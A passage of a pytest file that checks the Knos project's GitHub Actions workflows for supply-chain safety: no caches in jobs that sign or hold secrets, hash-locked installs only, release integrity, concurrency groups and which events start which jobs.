    published workflows restores one, saves one or lets an action do either, and `cache-mode: read` is on every job."""
    for name in PUBLISHED:
        for job_name, job in _jobs(name).items():
            assert job.get("cache-mode") == "read", (name, job_name)
            assert not _caches(job) and not [s for s in _steps(job) if "artifact" in str(s.get("uses", ""))], (name, job_name)


# The caches that may sit in a job which sees a secret: notes a script reads as data and never runs, written only by
# the workflow itself (on a schedule or by hand, never by a pull request's run). Anything that installs or builds in
# such a job has no cache at all.
DATA_CACHES = {("worker.yml", "relay"): {".knos-home"}, ("index.yml", "index"): {"~/.cache/knos-agent-pr-ci"}}


def _caches(job: dict) -> list[tuple[str, str]]:
    """Each step of a job that can restore or save an Actions cache: (action, what it caches). uv's cache is on unless
    `enable-cache` is false (its default is on for GitHub-hosted runners), and so is setup-node's when `packageManager`
    is named, unless `package-manager-cache` is false; any setup action with a `cache` input counts."""
    found = []
    for step in _steps(job):
        action, args = str(step.get("uses", "")).split("@")[0], step.get("with") or {}
        if action.startswith(("actions/cache", "Swatinem/rust-cache")):
            found.append((action, str(args.get("path", args.get("workspaces", "")))))
        elif action == "astral-sh/setup-uv" and args.get("enable-cache", "auto") is not False:
            found.append((action, "uv"))
        elif action == "actions/setup-node" and args.get("package-manager-cache") is not False:
            found.append((action, "npm"))
        elif args.get("cache"):
            found.append((action, str(args["cache"])))
    return found


def _sees_a_secret_or_signs(doc: dict, job: dict) -> bool:
    permissions = job.get("permissions", doc.get("permissions")) or {}
    return permissions.get("id-token") == "write" or "secrets." in json.dumps(job) or "secrets" in job


def test_no_job_that_signs_or_sees_a_secret_uses_a_cache():
    """Every job with `id-token: write` or any secret, in every workflow of the repository."""
    sensitive, cached = set(), set()
    for path in sorted(WF.glob("*.yml")):
        doc = _doc(path)
        for name, job in doc["jobs"].items():
            if _sees_a_secret_or_signs(doc, job):
                sensitive.add((path.name, name))
                if _caches(job):
                    cached.add((path.name, name))
                    # only the named data caches, and only through actions/cache: no installer, no build cache
                    assert (path.name, name) in DATA_CACHES, (path.name, name, _caches(job))
                    assert {a for a, _ in _caches(job)} <= {"actions/cache", "actions/cache/restore", "actions/cache/save"}, (path.name, name)
                    assert {p for _, p in _caches(job)} == DATA_CACHES[path.name, name], (path.name, name)
    assert cached == set(DATA_CACHES), "a data cache is listed that no job uses any more"
    # the test sees what it is meant to see: the jobs that sign, the jobs that hold a registry token, the relay
    assert {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest"), (ATTEST, "attest"), ("keys.yml", "keys"), ("worker.yml", "relay"),
            ("release.yml", "registry"), ("release.yml", "crates"), ("release.yml", "npmjs"), ("network.yml", "deploy"),
            ("index.yml", "index")} <= sensitive, sorted(sensitive)
    # the release: no job of it holds a way into PyPI (the wheel is uploaded before the push, by scripts/release.py), so the
    # ones that sign or see a secret are the three above and no other; and none of its jobs restores anything at all, since
    # what its build makes is held to the lock and attached to the release
    rel = _doc(WF / "release.yml")["jobs"]
    assert {job for name, job in sensitive if name == "release.yml"} == {"registry", "crates", "npmjs", "crates-trusted", "npm-trusted"}
    assert {name: _caches(job) for name, job in rel.items() if _caches(job)} == {}
    assert [s["with"] for s in _steps(rel["build"], "astral-sh/setup-uv@")] == [{"enable-cache": False}]
    # and it would catch the mistakes: uv's cache left at its default, a cache action, a rust cache, setup-node's automatic one
    for step in ({"uses": "astral-sh/setup-uv@x"}, {"uses": "astral-sh/setup-uv@x", "with": {"enable-cache": True}},
                 {"uses": "actions/cache@x", "with": {"path": "p"}}, {"uses": "Swatinem/rust-cache@x"},
                 {"uses": "actions/setup-node@x"}, {"uses": "actions/setup-python@x", "with": {"cache": "pip"}}):
        assert _caches({"steps": [step]}), step
    assert not _caches({"steps": [{"uses": "astral-sh/setup-uv@x", "with": {"enable-cache": False}},
                                  {"uses": "actions/setup-node@x", "with": {"package-manager-cache": False}}, {"run": "true"}]})


# ---- what a job that signs installs is named by hash ---------------------------------------------------------------------

INSTALLERS = re.compile(r"^\s*(?:uv tool install|uv pip install|uv sync|pip3? install|python3? -m pip install|pipx install|npm (?:install|ci|i)\b|cargo install)")


def _installs(job: dict) -> list[str]:
    """Every command of a job's scripts that installs something, a line continued with a backslash taken as one."""
    lines = [ln for script in _scripts(job) for ln in re.sub(r"\\\n\s*", " ", script).splitlines()]
    return [ln.strip() for ln in lines if INSTALLERS.match(ln)]


def _unhashed(doc: dict) -> list[tuple[str, str]]:
    """(job, command) for every install of a job that signs or sees a secret that is not `--require-hashes` all the way:
    nothing resolved (`--no-deps`), nothing built from source (`--no-build`), and no editable install."""
    return [(name, line) for name, job in doc["jobs"].items() if "steps" in job and _sees_a_secret_or_signs(doc, job)
            for line in _installs(job) if not ("--require-hashes" in line and "--no-deps" in line and "--no-build" in line and " -e " not in line)]


def test_every_job_that_signs_or_sees_a_secret_installs_by_hash_and_nothing_unhashed():
    """`--require-hashes` makes uv refuse any file whose sha256 the list does not hold, so what is released tomorrow, or
    swapped on the index, cannot run in a job that has a key or can ask GitHub to sign."""
    found = {}
    for path in [*sorted(WF.glob("*.yml")), *sorted(EXAMPLES.glob("*.yml"))]:      # Knos's own jobs, and the files an adopter commits
        doc = _doc(path)
        assert not _unhashed(doc), f"{path.name}: a job that signs or sees a secret installs without hashes: {_unhashed(doc)}"
        for name, job in doc["jobs"].items():
            if "steps" in job and _sees_a_secret_or_signs(doc, job) and _installs(job):
                found[path.name, name] = _installs(job)
    # the test sees what it is meant to: the four jobs that sign, the relay and the canary (it holds a token), each with its one
    # hash-locked install
    assert sorted(found) == sorted([*SIGNS, ("worker.yml", "relay"), ("knos-canary.yml", "canary")]), sorted(found)
    assert all(len(lines) == 1 and "--require-hashes" in lines[0] for lines in found.values()), found
    # and it would catch the mistakes: no hashes, hashes without --no-deps or --no-build, an editable install, a tool install
    signing = {"permissions": {"id-token": "write"}, "jobs": {}}
    for script, flagged in (("uv tool install --no-config knos==1", True), ("uv pip install -r requirements/sign.txt", True),
                            ("uv pip install --require-hashes -r sign.txt", True), ("uv pip install --require-hashes --no-deps -r sign.txt", True),
                            ("uv pip install --require-hashes --no-deps --no-build -e . -r sign.txt", True), ("pip install -q -e .", True),
                            ("npm ci", True), ("cargo install solana-verify", True),
                            ("uv pip install \\\n  --require-hashes --no-deps \\\n  --no-build -r sign.txt", False), ("echo uv tool install", False)):
        job = {"steps": [{"run": script}]}
        assert bool(_unhashed({**signing, "jobs": {"j": job}})) is flagged, script
    assert not _unhashed({"permissions": {"contents": "read"}, "jobs": {"j": {"steps": [{"run": "pip install -e ."}]}}})      # a job that signs nothing


def _requirements() -> dict[str, tuple[str, int]]:
    """requirements/sign.txt: package -> (version, number of hashes)."""
    text = (ROOT / "requirements" / "sign.txt").read_text(encoding="utf-8")
    return {m.group(1).lower(): (m.group(2), m.group(3).count("--hash=sha256:"))
            for m in re.finditer(r"^([\w.-]+)==(\S+) \\\n((?:    --hash=sha256:[0-9a-f]{64}(?: \\)?\n)+)", text, re.M)}


def test_the_signing_list_is_hash_locked_holds_solders_and_nothing_the_command_line_or_a_judge_would():
    pub = _script("pinned_workflows")
    text = pub.third_party()                     # raises unless every package is pinned with `==` and at least one sha256
    packages = _requirements()
    assert len(packages) == len([ln for ln in text.splitlines() if ln and not ln.startswith(("#", " "))])
    assert all(hashes >= 1 for _, hashes in packages.values())
    # it is what `uv pip compile` made from requirements/sign.in, whose direct requirements are knos's own (pyproject.toml)
    # lower bounds, and the compile left a header that says how to make it again
    assert "uv pip compile requirements/sign.in --generate-hashes" in text.splitlines()[1]
    direct = [ln for ln in (ROOT / "requirements" / "sign.in").read_text(encoding="utf-8").splitlines() if ln and not ln.startswith("#")]
    try:
        import tomllib
    except ModuleNotFoundError:   # Python 3.10
        import tomli as tomllib  # type: ignore[no-redef]
    declared = {re.split(r"[<>=!~; ]", d)[0].lower(): d for d in tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))["project"]["dependencies"]}
    for line in direct:
        name = re.split(r"[<>=!~; ]", line)[0].lower()
        assert declared[name].replace(" ", "") == line.replace(" ", ""), (name, line, declared[name])     # not looser than knos's own
        have = tuple(int(x) for x in re.findall(r"\d+", packages[name][0])[:3])
        floor = tuple(int(x) for x in re.findall(r"\d+", line.split(">=")[1])[:3])
        assert have >= floor, (name, packages[name][0], line)
    assert {"solders"} == {re.split(r"[<>=!~; ]", d)[0].lower() for d in direct}
    # what the signing path never needs is not on the list: the command line's typer and rich (the workflow commands are read
    # with argparse, tests/test_signing_path.py), the memory engine, a YAML reader, a test runner, a build tool
    assert not {"typer", "rich", "click", "sibyl-memory-client", "pyyaml", "pytest", "pip", "hatchling", "setuptools", "wheel", "tomli"} & set(packages)


def test_the_release_uploads_no_wheel_but_the_locked_one_and_attaches_the_lock_to_the_release(tmp_path, monkeypatch, capsys):
    """The order of docs/RELEASE.md: the wheel is built ONCE, before the commit; its sha256 is the last line of
    requirements/sign.txt; scripts/release.py uploads that file to PyPI before the push. So release.yml writes no lock
    and uploads no wheel to PyPI. It builds the wheel again only to hold the commit to its lock, holds PyPI to the
    same lock, and attaches that wheel and the commit's own sign.txt to the GitHub release."""
    rel = _doc(WF / "release.yml")["jobs"]
    build = _steps(rel["build"])
    ran = [str(s.get("run", "")) for s in build]
    # the build job: the wheel is the locked one or the step fails, before anything is put beside it or handed on
    [check] = [k for k, run in enumerate(ran) if "scripts/release.py wheel" in run]
    [lock] = [k for k, run in enumerate(ran) if "sign.txt" in run]
    [upload] = [k for k, s in enumerate(build) if str(s.get("uses", "")).startswith("actions/upload-artifact@")]
    assert ran[check] == "set -euo pipefail\npython3 scripts/release.py wheel --check\n" and check < lock < upload == len(build) - 1
    assert build[upload]["with"] == {"name": "release", "path": "dist/", "if-no-files-found": "error"}
    # the lock that goes with the release is the commit's own file, copied as it is: no job writes one, or builds a wheel any other way
    assert ran[lock].startswith("set -euo pipefail\n") and "cp requirements/sign.txt dist/sign.txt\n" in ran[lock]
    everything = "\n".join(run for job in rel.values() for run in _scripts(job))
    assert "pinned_workflows.py" not in everything and "uv build" not in everything and re.findall(r"\S*sign\.txt", everything) == ["requirements/sign.txt", "dist/sign.txt"]
    # no job has a way to put a file on PyPI
    assert not re.search(r"uv publish|twine|pypi-publish|release\.py publish|UV_PUBLISH_TOKEN|PYPI", json.dumps(rel))
    # the wheel leaves in one place: the build job's dist/, attached to the GitHub release once PyPI was found to serve that very file
    assert [name for name, job in rel.items() if _steps(job, "actions/download-artifact@")] == ["pypi", "github-release"]
    for name in ("pypi", "github-release"):
        assert [s["with"] for s in _steps(rel[name], "actions/download-artifact@")] == [{"name": "release", "path": "dist"}]
    assert _scripts(rel["pypi"]) == ["set -euo pipefail\npython3 scripts/release.py pypi-check --dist dist --wait 300\n"]
    assert rel["github-release"]["needs"] == ["tests", "build", "pypi"]
    attach = {name: re.findall(r"gh release (?:create|upload) \S+ (.+?) --", "\n".join(_scripts(job))) for name, job in rel.items()}
    assert {name: what for name, what in attach.items() if what} == {
        "github-release": ["dist/*", "dist/*"], "gemini": ['"linux.$name.tar.gz" "darwin.$name.tar.gz" "win32.$name.tar.gz"']}
    # and the step it rests on does what it says: with no lock, or with a lock for another file, it fails and leaves no wheel in dist/
    r = _script("release")
    version = _script("bump_version").project()
    wheel, sdist = r.names(version)

    def built(out: Path, root: Path = ROOT):
        (out / wheel).write_bytes(b"PK the wheel this commit builds")
        (out / sdist).write_bytes(b"the sdist")
        return out / wheel, out / sdist
    monkeypatch.setattr(r, "ROOT", tmp_path)
    monkeypatch.setattr(r, "build", built)
    mine = hashlib.sha256(b"PK the wheel this commit builds").hexdigest()
    for locked, said in ((None, "the release was not locked"), ((version, "e" * 64), "NOT the locked wheel"), (("0.0.1", mine), "NOT the locked wheel")):
        monkeypatch.setattr(r, "lock_hash", lambda root=ROOT, locked=locked: locked)
        assert r.wheel_cmd(check=True) == 1 and said in capsys.readouterr().out and not (tmp_path / "dist" / wheel).exists()
    monkeypatch.setattr(r, "lock_hash", lambda root=ROOT: (version, mine))
    assert r.wheel_cmd(check=True) == 0 and r.sha256(tmp_path / "dist" / wheel) == mine and sorted(p.name for p in (tmp_path / "dist").iterdir()) == sorted([wheel, sdist])
    # nothing inside the package can name the commit of the published workflows: the commit holds the wheel's hash
    named = [p.relative_to(ROOT).as_posix() for p in (ROOT / "src" / "knos").rglob("*") if p.is_file()
             and re.search(rb"knos-workflows/(?:\.github|[0-9a-f]{40}|KNOS_WORKFLOWS_SHA)", p.read_bytes())]
    assert named == [], f"the wheel would name the commit that holds its own hash: {named}"


# ---- two runs for the same issue or pull request do not race ------------------------------------------------------------

def test_runs_for_one_issue_or_pull_request_wait_for_each_other_and_none_is_dropped():
    fund, prove, check = _jobs("fund.yml"), _jobs("prove.yml"), _jobs("check.yml")
    # commands on one issue or pull request run one at a time, each in its turn: every comment is answered
    assert fund["command"]["concurrency"] == {"group": "knos-command-${{ github.event.issue.number }}", "queue": "max"}
    # a push does not say which pull requests it merged: each merge waits in the line of the commit it pushed, so one
    # merge never waits for another's relay, two runs of one commit run in turn, and no run is dropped. Runs started
    # by hand share one line. A comment, which anyone can write, waits in its pull request's own line: comments
    # cannot fill a line merges wait in.
    line = prove["settle"]["concurrency"]
    assert line["queue"] == "max" and prove["attest"]["concurrency"] == {"group": "knos-settle", "queue": "max"}
    group = line["group"][3:-2].strip()
    one, two = (_push() for _ in range(2))
    one["github"]["sha"], two["github"]["sha"] = "a" * 40, "b" * 40
    assert value(group, one) == "knos-settle-push-" + "a" * 40 and value(group, two) == "knos-settle-push-" + "b" * 40
    assert value(group, _event("workflow_dispatch", {"inputs": {"pull": "7"}})) == "knos-settle"
    # attest shares the line of the runs started by hand, not a merge's: a merge does not wait for it, and its file says so
    assert prove["attest"]["concurrency"]["group"] not in (value(group, one), value(group, two))
    assert "the same line as a merge" not in (WF / "prove.yml").read_text(encoding="utf-8")
    assert value(group, _comment("/knos settle", pull=True)) == "knos-settle-7"
    assert value(group, _comment("/knos settle", pull=True)) not in (value(group, one), value(group, two), "knos-settle")
    who = "${{ github.event.workflow_run.head_repository.id }}-${{ github.event.workflow_run.head_branch }}"
    assert prove["review"]["concurrency"] == {"group": f"knos-review-{who}"}       # the newest waiting review replaces an older one
    assert prove["judge"]["concurrency"] == {"group": f"knos-judge-{who}"}
    assert check["claims"]["concurrency"] == {"group": "knos-check-${{ github.event.pull_request.number }}", "cancel-in-progress": True}
    groups = [job["concurrency"]["group"].split("$")[0] for jobs in (fund, prove, check) for job in jobs.values() if job is not prove["settle"]]
    assert all(g.startswith("knos-") for g in groups) and len(set(groups)) == 5
    for name in REUSABLE:
        assert "concurrency" not in _doc(WF / name)
        for job in _jobs(name).values():      # GitHub refuses `queue: max` together with cancel-in-progress
            assert not (job["concurrency"].get("queue") == "max" and job["concurrency"].get("cancel-in-progress"))
    # A calling file sets no group of its own: one that matched a called job's would make GitHub cancel the run.
    for example in OWN:
        doc = _doc(EXAMPLES / example)
        assert "concurrency" not in doc and all("concurrency" not in job for job in doc["jobs"].values()), example


# ---- which events start which job -------------------------------------------------------------------------------------

REPOSITORY = {"default_branch": "main", "name": "widgets", "description": "Widgets for everyone."}


def _event(name: str, event: dict, **over) -> dict:
    return {"github": {"event_name": name, "event": {"repository": REPOSITORY, **event}, "ref": "refs/heads/main", "actor": "mona",
                       "repository": "octo/widgets", "run_number": "7", **over}, "inputs": {}}


def _comment(body: str, pull: bool = False, action: str = "created") -> dict:
    issue = {"number": 7, **({"pull_request": {"url": "https://api.github.com/repos/o/r/pulls/7"}} if pull else {})}
    return _event("issue_comment", {"action": action, "comment": {"body": body}, "issue": issue})


def _issue(body: str | None, action: str = "opened") -> dict:
    return _event("issues", {"action": action, "issue": {"number": 9, "body": body}})


def _push(ref: str = "refs/heads/main", actor: str = "mona", default: str = "main") -> dict:
    return _event("push", {"ref": ref, "repository": {**REPOSITORY, "default_branch": default}}, ref=ref, actor=actor)


def _checked(conclusion: str = "success", event: str = "pull_request") -> dict:
    return _event("workflow_run", {"action": "completed", "workflow_run": {"event": event, "conclusion": conclusion, "head_sha": "a" * 40,
                                                                           "head_branch": "fix", "head_repository": {"id": 99}, "pull_requests": []}})


def _started(doc: dict, context: dict, said: dict | None = None, cancelled: bool = False) -> set[str]:
    """The jobs of a workflow that run for an event, in the order the file lists them (a job's needs come first).
    `said`: the outputs a job gives when it runs, by job."""
    ran, results, needs = set(), {}, {}
    for name, job in doc["jobs"].items():
        wanted = [job["needs"]] if isinstance(job.get("needs"), str) else list(job.get("needs", []))
        if runs(job.get("if"), {**context, "needs": {n: needs[n] for n in wanted}}, {n: results[n] for n in wanted}, cancelled):
            ran.add(name)
        results[name] = "success" if name in ran else "skipped"
        needs[name] = {"result": results[name], "outputs": (said or {}).get(name, {}) if name in ran else {}}
    return ran


SETTLE = {"command": {"settle": "7"}}       # what `knos command` writes when a payment should be tried next
SAMPLES = [   # (what happened, the event, what the command job said, the jobs of knos.yml that run)
    ("an ordinary comment", _comment("Looks good to me, thanks!"), None, set()),
    ("a comment that only mentions a command", _comment("You can type /knos take to reserve it."), None, set()),
    ("a quoted command", _comment("> /knos take\n\nWhat does this do?"), None, set()),
    ("a command", _comment("/knos take"), None, {"command"}),
    ("a command, capitalised by a phone", _comment("/Knos fund 20"), None, {"command"}),
    ("a command after a sentence and blank lines, as GitHub's editor sends them", _comment("I can do this.\r\n\r\n/knos take"), None, {"command"}),
    ("a command the judge will not know", _comment("/knos frobnicate"), None, {"command"}),
    ("settle, on a pull request", _comment("/knos settle", pull=True), SETTLE, {"command", "settle"}),
    ("settle, typed with two spaces", _comment("/knos  settle", pull=True), SETTLE, {"command", "settle"}),
    ("a tip that was funded", _comment("/KNOS tip 5", pull=True), SETTLE, {"command", "settle"}),
    ("a tip from someone who may not tip: the command answers, and nothing is settled", _comment("/knos tip 5", pull=True), None, {"command"}),
    ("another command on a pull request", _comment("/knos address 4G3cznCnwCUPBCZwzKiLupjdgB5pSoCcGWNGuFv4TYFo", pull=True), None, {"command"}),
    ("a comment on a pull request that only talks about settling", _comment("when will /knos settle run?", pull=True), SETTLE, set()),
    ("a new issue", _issue("The slug keeps punctuation.\n\nSteps: ..."), None, set()),
    ("a new issue with no description", _issue(None), None, set()),
    ("a new issue that funds itself", _issue("The slug keeps punctuation.\n\n/knos fund 20\n"), None, {"command"}),
    ("a new issue that funds itself, the old word", _issue("/knos bounty 12.5"), None, {"command"}),
    ("a merge: a push to the default branch", _push(), None, {"settle"}),
    ("a merge where the default branch is called master", _push("refs/heads/master", default="master"), None, {"settle"}),
    ("a merge by the merge queue", _push(actor="github-merge-queue[bot]"), None, {"settle"}),
    ("a push to another branch", _push("refs/heads/feature/x"), None, set()),
    ("a push to a branch whose name ends like the default one", _push("refs/heads/not-main"), None, set()),
    ("a tag", _push("refs/tags/v1.0.0"), None, set()),
    ("a run started by hand", _event("workflow_dispatch", {"inputs": {"pull": "12"}}), None, {"settle"}),
    ("the check passed", _checked("success"), None, {"review"}),
    ("the check failed", _checked("failure"), None, {"review"}),
    ("the check waits for a maintainer's approval", _checked("action_required"), None, set()),
    ("the check was replaced by a newer run", _checked("cancelled"), None, set()),
    ("the check never started", _checked("startup_failure"), None, set()),
    ("a workflow of the same name that a push started", _checked("success", event="push"), None, set()),
]


@pytest.mark.parametrize("what,context,said,want", SAMPLES, ids=[s[0] for s in SAMPLES])
def test_ordinary_comments_and_pushes_start_no_job_and_each_event_starts_the_right_one(what, context, said, want):
    caller = _doc(EXAMPLES / "knos-workflow.yml")
    assert _started(caller, context, said) == want
    assert _started(caller, context, said, cancelled=True) == set()          # a cancelled run pays nothing
    # What a calling job starts is exactly one job of the workflow it calls: the two files never disagree.
    first = {name: {job for job, spec in _jobs(name).items() if "needs" not in spec and runs(spec.get("if"), context)}
             for name in ("fund.yml", "prove.yml")}
    for job in want:
        assert first[caller["jobs"][job]["uses"][len(CALLED):].split("@")[0]] == {job}, job


def test_the_called_workflows_refuse_by_themselves_what_no_caller_should_send():
    """Their own conditions do not depend on a caller's: whatever file calls them, an edited comment commands nothing,
    and a push that is not to the default branch settles nothing."""
    command, prove = _jobs("fund.yml")["command"]["if"], _jobs("prove.yml")
    assert runs(command, _comment("/knos take")) and runs(command, _issue("/knos fund 5"))
    # an attestor's runs (by hand, a timer) reach the command too: it funds nothing unless the repository's policy names it the attestor
    assert runs(command, _event("workflow_dispatch", {"inputs": {"repository": "acme/app"}})) and runs(command, _event("schedule", {"schedule": "*/15 * * * *"}))
    for refused in (_comment("/knos take", action="edited"), _comment("/knos take", action="deleted"), _issue("/knos fund 5", action="edited"),
                    _push(), _checked(), _event("pull_request", {"action": "opened"})):
        assert not runs(command, refused), refused["github"]["event_name"]
    settle, review = prove["settle"]["if"], prove["review"]["if"]
    assert runs(settle, _push()) and runs(settle, _event("workflow_dispatch", {})) and runs(settle, _comment("/knos settle", pull=True))
    assert runs(settle, _event("schedule", {"schedule": "*/15 * * * *"}))
    for refused in (_push("refs/heads/feature/x"), _push("refs/tags/v1"), _comment("/knos settle", pull=True, action="edited"),
                    _comment("/knos settle"), _issue("/knos fund 5"), _checked(),
                    _event("pull_request", {"action": "closed", "pull_request": {"merged": True}})):
        assert not runs(settle, refused), refused["github"]
    assert runs(review, _checked("success")) and runs(review, _checked("failure"))
    for refused in (_checked("action_required"), _checked("cancelled"), _checked("skipped"), _checked("success", event="push"),
                    _checked("success", event="schedule"), _push(), _comment("/knos settle", pull=True)):
        assert not runs(review, refused), refused["github"]["event"]
    assert sorted(j for j, spec in prove.items() if "needs" not in spec) == ["review", "settle"]


def test_the_file_a_repository_installs_listens_for_what_decision_6_names_and_nothing_else():
    doc = _doc(EXAMPLES / "knos-workflow.yml")
    assert doc["name"] == "knos" and set(doc["on"]) == {"issue_comment", "issues", "push", "workflow_dispatch", "workflow_run"}
    assert doc["on"]["issue_comment"] == {"types": ["created"]} and doc["on"]["issues"] == {"types": ["opened"]}
    assert doc["on"]["push"] == {"branches": ["**"]}                       # branches, never tags
    assert doc["on"]["workflow_dispatch"]["inputs"] == {"pull": {"description": doc["on"]["workflow_dispatch"]["inputs"]["pull"]["description"],
                                                                 "required": True, "type": "number"}}
    check = _doc(EXAMPLES / "knos-check.yml")
    # the review waits for the workflow of the check's name, and only one workflow in this repository has that name
    assert doc["on"]["workflow_run"] == {"workflows": [check["name"]], "types": ["completed"]} and check["name"] == "knos check"
    assert [p.name for p in WF.glob("*.yml") if _doc(p).get("name") == check["name"]] == ["knos-check.yml"]
    assert set(check["on"]) == {"pull_request"} and "edited" in check["on"]["pull_request"]["types"]   # a description changed is a claim changed
    jobs = doc["jobs"]
    assert list(jobs) == ["command", "settle", "review"] and list(check["jobs"]) == ["check"]
    assert [jobs[j]["uses"].split("@")[0] for j in jobs] == [CALLED + "fund.yml", CALLED + "prove.yml", CALLED + "prove.yml"]
    assert check["jobs"]["check"]["uses"].startswith(f"{CALLED}check.yml@")
    assert jobs["settle"]["needs"] == "command" and "needs" not in jobs["review"] and "needs" not in jobs["command"]
    # the command says when a payment follows (`/knos settle`, a tip that was funded): the comment's words are not read twice
    assert "needs.command.outputs.settle != ''" in jobs["settle"]["if"] and "comment.body" not in jobs["settle"]["if"]
    for job in (*jobs.values(), *check["jobs"].values()):
        assert set(job) <= {"name", "needs", "if", "permissions", "uses", "secrets"}, "a thin job: when to call, what it may do, what to call"


def test_knos_own_jobs_have_the_names_the_judge_knows_as_its_own():
    """A check run that is Knos's own is never evidence about a pull request, and a bounty cannot require one. GitHub
    names a called job "<calling job's name> / <called job>"."""
    from knos import terms
    names = [f"{spec.get('name', caller)} / {job}" for example in OWN for caller, spec in _doc(EXAMPLES / example)["jobs"].items()
             for job in _jobs(spec["uses"][len(CALLED):].split("@")[0])]
    assert sorted(set(names)) == ["check / claims", "knos command / command", "knos review / attest", "knos review / judge",
                                  "knos review / review", "knos review / settle", "knos settle / attest", "knos settle / judge",
                                  "knos settle / review", "knos settle / settle"]
    assert all(terms.ours({"name": n}, "") for n in names), [n for n in names if not terms.ours({"name": n}, "")]
    assert not terms.ours({"name": "settle / settle"}, "") and not terms.ours({"name": "test"}, "")      # why the names matter
    assert all("name" not in job for name in REUSABLE for job in _jobs(name).values())      # a called job's name is its key


# ---- the claim file ----------------------------------------------------------------------------------------------------

def test_the_claim_caller_names_the_pinned_commit_and_takes_the_address_from_the_right_place():
    ids = json.loads((ROOT / "programs-v2" / "program_ids.json").read_text(encoding="utf-8"))
    doc = _doc(EXAMPLES / "knos-claim.yml")
    [job] = doc["jobs"].values()
    assert doc["name"] == "knos claim" and list(doc["jobs"]) == ["claim"]
    assert job["uses"] == f"{ROTATE}claim.yml@{ids['claim_sha']}" == f"{ROTATE}claim.yml@80e796d341f65060767939c4e65a38ede5fa1ac8"
    lib = (ROOT / "programs-v2" / "knos_pay" / "src" / "lib.rs").read_text(encoding="utf-8")
    assert f'CLAIM_SHA: &[u8; 40] = b"{ids["claim_sha"]}"' in lib and f'CLAIM_REF: &[u8] = b"{ROTATE}claim.yml@"' in lib
    assert job["permissions"] == {"id-token": "write", "issues": "write"} and set(job) == {"permissions", "uses", "with"}
    # binding a wallet is by hand only (the program takes only a workflow_dispatch bind token): no push, no condition
    # that reads the repository's description, and the address is the one input
    assert set(doc["on"]) == {"workflow_dispatch"}
    assert doc["on"]["workflow_dispatch"]["inputs"]["address"]["required"] is True
    assert job["with"] == {"address": "${{ inputs.address }}"}
    text = (EXAMPLES / "knos-claim.yml").read_text(encoding="utf-8")
    code = "\n".join(ln for ln in text.splitlines() if not ln.lstrip().startswith("#"))
    assert not re.search(r"repository\.description|\bpush\b|run_number|event\.repository", code)
    said = _comments(EXAMPLES / "knos-claim.yml")
    assert "by hand only" in said and "an address that arrives in a link could be someone else's" in said.lower()
    assert "Actions > knos claim > Run workflow" in said and "`knos claim <address>`" in said
    assert "Check the description before you create the repository" not in said and "first run" not in said
    # an organisation's: the same file but for the claim workflow's later commit, which takes `kind`, and `kind: org`
    org = _doc(EXAMPLES / "knos-claim-org.yml")
    [theirs] = org["jobs"].values()
    assert theirs["uses"] == f"{ROTATE}claim.yml@{ids['claim_sha_org']}" == f"{ROTATE}claim.yml@212f9eb5f584eb6f8cd2d6673878132fc0011e27"
    assert f'CLAIM_SHA_ORG: &[u8; 40] = b"{ids["claim_sha_org"]}"' in (ROOT / "programs-v2" / "knos_pay" / "src" / "order_judge.rs").read_text(encoding="utf-8")
    assert theirs["with"] == {"address": "${{ inputs.address }}", "kind": "org"} and theirs["permissions"] == job["permissions"]
    assert (org["name"], org["on"], org["permissions"]) == (doc["name"], {"workflow_dispatch": {"inputs": {"address": {
        **doc["on"]["workflow_dispatch"]["inputs"]["address"], "description": org["on"]["workflow_dispatch"]["inputs"]["address"]["description"]}}}}, doc["permissions"])
    theirs_said = _comments(EXAMPLES / "knos-claim-org.yml")
    assert "`knos claim --org <organisation> <address>`" in theirs_said and "by hand only" in theirs_said and "never replaces a wallet a person bound" in theirs_said


# ---- the attestation workflow, the caller a seller commits, and the canary ------------------------------------------------

def test_attest_takes_facts_never_code_reads_the_public_record_and_asks_for_one_signed_statement():
    doc = _doc(WF / ATTEST)
    assert set(doc["on"]) == {"workflow_call", "workflow_dispatch"}
    called, by_hand = doc["on"]["workflow_call"]["inputs"], doc["on"]["workflow_dispatch"]["inputs"]
    assert called == by_hand and set(called) == set(ATTEST_INPUTS)            # the same five inputs, called or started by hand
    assert {k: (v["required"], v["type"]) for k, v in called.items()} == {
        "repository": (True, "string"), "pull": (True, "number"), "order": (True, "string"), "kind": (True, "string"), "payees": (False, "string")}
    assert "secrets" not in doc["on"]["workflow_call"] and "secrets." not in json.dumps(doc)       # no secret, optional or not
    assert doc["permissions"] == {} and list(doc["jobs"]) == ["attest"]
    job = doc["jobs"]["attest"]
    # read GitHub's record; post the signed statement on the "knos tokens" issue, where a relayer finds it; the statement itself
    assert job["permissions"] == {"contents": "read", "issues": "write", "id-token": "write"}
    assert "knos tokens" in _comments(WF / ATTEST) and "writes nothing" not in _comments(WF / ATTEST)
    assert job["runs-on"] == "ubuntu-24.04" and job["cache-mode"] == "read" and "env" not in job and "container" not in job and "needs" not in job
    # no checkout of anything, no git, nothing a pull request wrote on disk: uv, the hash-locked install, the command
    assert [s["uses"].split("@")[0] for s in _steps(job) if "uses" in s] == ["astral-sh/setup-uv"] and _steps(job, "astral-sh/setup-uv@")[0]["with"] == SETUP_UV
    assert _scripts(job) == [LOCKED_INSTALL, ATTEST_COMMAND]
    assert not re.search(r"\bgit\b|refs/pull|gh pr checkout", "\n".join(_scripts(job)))
    # what people wrote reaches the command as environment variables, one each, and never inside the script
    [step] = [s for s in _steps(job) if s.get("run") == ATTEST_COMMAND]
    assert step["env"] == {"GH_TOKEN": "${{ github.token }}", "R": "${{ inputs.repository }}", "P": "${{ inputs.pull }}",
                           "O": "${{ inputs.order }}", "K": "${{ inputs.kind }}", "PAYEES": "${{ inputs.payees }}"}
    assert "${{" not in "".join(_scripts(job)) and "KNOS_RELAY_KEY" not in json.dumps(doc)
    said = _comments(WF / ATTEST)
    for words in ("No checkout", "No secret", "nothing a caller passes can change which code runs here", "pay (the terms were met)", "take (reserve",
                  "revert (inside the warranty", "rule (the arbiter", "why a run in a seller's own repository is trusted", "a personal account cannot give a machine of its own that label",
                  "The kind eval is a buyer's, for knos_meter", "posts it as `knos-eval:`", "from the run's first attempt only"):
        assert words in said, words
    # the published path to a meter evaluation: kind eval, whose `order` carries the evaluation (`knos attest` reads it)
    from knos import flow
    assert "eval" in flow.KINDS and "pay, take, revert, rule and eval" in called["kind"]["description"]
    assert "For eval, the evaluation instead, as order.milestone.rate" in called["order"]["description"]
    assert not re.search(r"\bimmutable\b|nobody can change", (WF / ATTEST).read_text(encoding="utf-8"), re.I)
